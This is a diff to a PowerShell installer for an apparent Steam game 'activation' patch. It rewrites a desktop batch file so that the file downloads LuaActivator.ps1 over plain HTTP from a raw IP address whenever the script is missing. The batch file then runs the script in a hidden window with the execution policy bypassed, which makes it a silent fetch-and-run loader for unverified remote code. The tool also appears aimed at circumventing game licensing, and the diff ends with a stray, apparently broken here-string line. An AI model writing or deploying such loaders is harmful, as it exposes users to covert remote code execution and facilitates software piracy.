@@ -121,13 +121,27 @@ try {
     }
 }
 
-# ========== 生成桌面启动bat ==========
+# ========== 【核心修改点】生成带自我修复功能的桌面启动bat ==========
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $batPath = Join-Path $desktopPath "游戏激活程序.bat"
+# 这个 bat 会先检查 LuaActivator.ps1 是否存在，不存在则自动下载，然后运行。
 $batContent = @"
 @echo off
 chcp 65001 >nul
-start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Program Files\SteamPatch\LuaActivator.ps1"
+set "PS_FILE=C:\Program Files\SteamPatch\LuaActivator.ps1"
+set "DOWNLOAD_URL=http://47.100.104.45/files/LuaActivator.ps1"
+
+if not exist "%PS_FILE%" (
+    echo 正在自动下载激活工具，请稍候...
+    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%PS_FILE%'"
+)
+
+if exist "%PS_FILE%" (
+    start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_FILE%"
+) else (
+    echo 激活工具下载失败，请检查网络连接。
+    pause
+)
 exit
 "@
 $batContent | Out-File $batPath -Encoding Default -Force
@@ -154,3 +168,4 @@ if (Test-Path $activatorFullPath) {
 
 Start-Sleep -Seconds 5
 exit 0
+"@
